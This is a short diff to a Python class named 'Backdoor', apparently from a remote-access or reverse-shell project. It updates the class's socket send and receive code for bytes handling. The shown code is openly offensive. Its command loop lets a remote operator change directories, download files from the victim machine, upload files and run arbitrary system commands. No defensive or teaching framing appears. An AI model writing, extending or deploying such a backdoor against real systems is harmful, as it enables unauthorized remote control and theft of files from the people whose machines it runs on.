@@ -18,10 +18,10 @@ class Backdoor:
         # convert data as json
         json_data = json.dumps(data)
         # send data as json
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 # receive data as json
@@ -61,12 +61,12 @@ class Backdoor:
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
-                    command_result = self.read_file(command[1])
+                    command_result = self.read_file(command[1]).decode()
                 elif command[0] == "upload":
                     command_result = self.write_file(command[1], command[2])
                 else:
                     # pass this command variable to a function named execute_system_command
-                    command_result = self.execute_system_command(command)
+                    command_result = self.execute_system_command(command).decode()
             except Exception:
                 command_result = "[-] Error during command execution"
             # print(command_result)  to see that the base64 converts the file into known parsable characters
